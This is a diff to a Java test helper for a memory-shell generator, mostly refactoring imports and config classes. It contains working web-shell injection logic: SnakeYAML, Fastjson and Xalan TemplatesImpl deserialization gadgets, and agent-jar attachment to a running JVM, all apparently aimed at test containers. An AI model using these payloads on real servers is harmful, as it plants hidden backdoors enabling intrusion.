@@ -8,8 +8,19 @@ import com.reajason.javaweb.memshell.MemShellGenerator;
 import com.reajason.javaweb.memshell.MemShellResult;
 import com.reajason.javaweb.memshell.ShellTool;
 import com.reajason.javaweb.memshell.ShellType;
-import com.reajason.javaweb.memshell.config.*;
+import com.reajason.javaweb.memshell.config.InjectorConfig;
+import com.reajason.javaweb.memshell.config.ShellConfig;
+import com.reajason.javaweb.memshell.config.ShellToolConfig;
+import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordConfig;
+import com.reajason.javaweb.memshell.shelltool.behinder.BehinderConfig;
+import com.reajason.javaweb.memshell.shelltool.command.CommandConfig;
+import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaConfig;
+import com.reajason.javaweb.memshell.shelltool.neoreg.NeoreGeorgConfig;
+import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Config;
+import com.reajason.javaweb.memshell.shelltool.suo5v2.Suo5v2Config;
+import com.reajason.javaweb.packer.ClassPackerConfig;
 import com.reajason.javaweb.packer.JarPacker;
+import com.reajason.javaweb.packer.JarPackerConfig;
 import com.reajason.javaweb.packer.Packers;
 import com.reajason.javaweb.packer.jar.*;
 import com.reajason.javaweb.packer.translet.XalanAbstractTransletPacker;
@@ -21,10 +32,9 @@ import okhttp3.HttpUrl;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
 import okhttp3.Response;
-import org.apache.commons.io.FileUtils;
-import org.apache.commons.lang3.RandomStringUtils;
-import org.apache.commons.lang3.StringUtils;
-import org.apache.commons.lang3.tuple.Pair;
+import com.reajason.javaweb.utils.RandomUtils;
+import com.reajason.javaweb.utils.StringUtils;
+import com.reajason.javaweb.utils.tuple.Pair;
 import org.hamcrest.Matchers;
 import org.testcontainers.containers.Container;
 import org.testcontainers.containers.GenericContainer;
@@ -120,24 +130,24 @@ public class ShellAssertion {
             return;
         }
         if (packer.getInstance() instanceof ScriptEngineJarPacker) {
-            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(generateResult.toJarPackerConfig());
+            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(JarPackerConfig.from(generateResult));
             Path tempJar = Files.createTempFile("temp", "jar");
             Files.write(tempJar, bytes);
             String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
             appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
-            FileUtils.deleteQuietly(tempJar.toFile());
+            Files.deleteIfExists(tempJar);
             content = "!!javax.script.ScriptEngineManager [\n" +
                     "  !!java.net.URLClassLoader [[\n" +
                     "    !!java.net.URL [\"file://" + jarPath + "\"]\n" +
                     "  ]]\n" +
                     "]";
         } else if (packer.getInstance() instanceof GroovyTransformJarPacker) {
-            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(generateResult.toJarPackerConfig());
+            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(JarPackerConfig.from(generateResult));
             Path tempJar = Files.createTempFile("temp", "jar");
             Files.write(tempJar, bytes);
             String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
             appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
-            FileUtils.deleteQuietly(tempJar.toFile());
+            Files.deleteIfExists(tempJar);
             VulTool.postIsOk(url + "/fastjson", """
                     {
                       "@type":"java.lang.Exception",
@@ -154,10 +164,10 @@ public class ShellAssertion {
                     "  }\n" +
                     "}";
         } else if (packer.getInstance() instanceof XalanAbstractTransletPacker) {
-            String bytes = packer.getInstance().pack(generateResult.toClassPackerConfig());
+            String bytes = packer.getInstance().pack(ClassPackerConfig.from(generateResult));
             content = "[\"org.apache.xalan.xsltc.trax.TemplatesImpl\",{\"transletName\":\"businessObject\",\"transletBytecodes\":[\"" + bytes + "\"],\"outputProperties\":{}}]";
         } else {
-            content = packer.getInstance().pack(generateResult.toClassPackerConfig());
+            content = packer.getInstance().pack(ClassPackerConfig.from(generateResult));
         }
         injectIsOk(url, shellType, shellTool, content, packer, appContainer);
         log.info("send inject payload successfully");
@@ -165,12 +175,12 @@ public class ShellAssertion {
 
     private static void injectAgentJar(MemShellResult generateResult, String shellTool, String shellType, Packers packer, GenericContainer<?> appContainer) throws IOException, InterruptedException {
         if (packer.getInstance() instanceof AgentJarPacker) {
-            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(generateResult.toJarPackerConfig());
+            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(JarPackerConfig.from(generateResult));
             Path tempJar = Files.createTempFile("temp", "jar");
             Files.write(tempJar, bytes);
             String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
             appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
-            FileUtils.deleteQuietly(tempJar.toFile());
+            Files.deleteIfExists(tempJar);
             String pidInContainer = appContainer.execInContainer("bash", "/fetch_pid.sh").getStdout().trim();
             assertDoesNotThrow(() -> Long.parseLong(pidInContainer));
             String stdout = appContainer.execInContainer("/jattach", pidInContainer, "load", "instrument", "false", jarPath).getStdout();
@@ -180,12 +190,12 @@ public class ShellAssertion {
                     containsString("JVM response code = 0")
             ));
         } else if (packer.getInstance() instanceof AgentJarWithJREAttacherPacker || packer.getInstance() instanceof AgentJarWithJDKAttacherPacker) {
-            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(generateResult.toJarPackerConfig());
+            byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(JarPackerConfig.from(generateResult));
             Path tempJar = Files.createTempFile("temp", "jar");
             Files.write(tempJar, bytes);
             String jarPath = "/" + shellTool + shellType + packer.name() + ".jar";
             appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
-            FileUtils.deleteQuietly(tempJar.toFile());
+            Files.deleteIfExists(tempJar);
             String pidInContainer = appContainer.execInContainer("bash", "/fetch_pid.sh").getStdout();
             assertDoesNotThrow(() -> Long.parseLong(pidInContainer));
             Container.ExecResult execResult = appContainer.execInContainer("java", "-jar", jarPath, pidInContainer);
@@ -237,8 +247,10 @@ public class ShellAssertion {
                 behinderIsOk(shellUrl, ((BehinderConfig) generateResult.getShellToolConfig()));
                 break;
             case Suo5:
+                suo5IsOk(shellTool, shellUrl, ((Suo5Config) generateResult.getShellToolConfig()).getHeaderValue());
+                break;
             case Suo5v2:
-                suo5IsOk(shellTool, shellUrl, ((Suo5Config) generateResult.getShellToolConfig()));
+                suo5IsOk(shellTool, shellUrl, ((Suo5v2Config) generateResult.getShellToolConfig()).getHeaderValue());
                 break;
             case AntSword:
                 antSwordIsOk(shellUrl, ((AntSwordConfig) generateResult.getShellToolConfig()));
@@ -305,8 +317,8 @@ public class ShellAssertion {
         assertTrue(behinderManager.test());
     }
 
-    public static void suo5IsOk(String shellTool, String entrypoint, Suo5Config shellConfig) {
-        assertTrue(Suo5Manager.test(shellTool, entrypoint, shellConfig.getHeaderValue()));
+    public static void suo5IsOk(String shellTool, String entrypoint, String headerValue) {
+        assertTrue(Suo5Manager.test(shellTool, entrypoint, headerValue));
     }
 
     public static void antSwordIsOk(String entrypoint, AntSwordConfig shellConfig) {
@@ -320,7 +332,7 @@ public class ShellAssertion {
 
     public static ShellToolConfig getShellToolConfig(String shellType, String shellTool, Packers packer) {
         ShellToolConfig shellToolConfig = null;
-        String uniqueName = shellTool + RandomStringUtils.randomAlphabetic(5) + shellType + RandomStringUtils.randomAlphabetic(5) + packer.name();
+        String uniqueName = shellTool + RandomUtils.randomAlphabetic(5) + shellType + RandomUtils.randomAlphabetic(5) + packer.name();
         switch (shellTool) {
             case Godzilla:
                 String godzillaPass = "pass";
@@ -347,12 +359,18 @@ public class ShellAssertion {
                 log.info("generated {} behinder with pass: {}, User-Agent: {}", shellType, behinderPass, uniqueName);
                 break;
             case Suo5:
-            case Suo5v2:
                 shellToolConfig = Suo5Config.builder()
                         .headerName("User-Agent")
                         .headerValue(uniqueName)
                         .build();
                 log.info("generated {} suo5 with User-Agent: {}", shellType, uniqueName);
+                break;
+            case Suo5v2:
+                shellToolConfig = Suo5v2Config.builder()
+                        .headerName("User-Agent")
+                        .headerValue(uniqueName)
+                        .build();
+                log.info("generated {} suo5v2 with User-Agent: {}", shellType, uniqueName);
                 break;
             case AntSword:
                 String antPassword = "ant";
@@ -397,7 +415,7 @@ public class ShellAssertion {
                 .shrink(true)
                 .lambdaSuffix(true)
                 .build();
-        return MemShellGenerator.generate(shellConfig, injectorConfig, shellToolConfig);
+        return new MemShellGenerator().generate(shellConfig, injectorConfig, shellToolConfig);
     }
 
     public static void injectIsOk(String url, String shellType, String shellTool, String content, Packers packer, GenericContainer<?> container) {
@@ -485,8 +503,8 @@ public class ShellAssertion {
         CommandConfig commandConfig = CommandConfig.builder()
                 .paramName(paramName)
                 .build();
-        MemShellResult generateResult = MemShellGenerator.generate(shellConfig, injectorConfig, commandConfig);
-        String content = packer.getInstance().pack(generateResult.toClassPackerConfig());
+        MemShellResult generateResult = new MemShellGenerator().generate(shellConfig, injectorConfig, commandConfig);
+        String content = packer.getInstance().pack(ClassPackerConfig.from(generateResult));
         String res = VulTool.postIsOk(url + "/biginteger", content);
         assertThat(res, anyOf(
                 Matchers.containsString("context: "),
@@ -522,12 +540,12 @@ public class ShellAssertion {
                 shellType, shellTool, config.getTargetJdkVersion(), shellToolConfig, packer);
 
         // Pack and copy to container
-        byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(generateResult.toJarPackerConfig());
+        byte[] bytes = ((JarPacker) packer.getInstance()).packBytes(JarPackerConfig.from(generateResult));
         Path tempJar = Files.createTempFile("temp", "jar");
         Files.write(tempJar, bytes);
         String jarPath = "/listProcessTest.jar";
         appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
-        FileUtils.deleteQuietly(tempJar.toFile());
+        Files.deleteIfExists(tempJar);
 
         // Test 1: List processes (no args)
         Container.ExecResult listResult = appContainer.execInContainer("java", "-jar", jarPath);
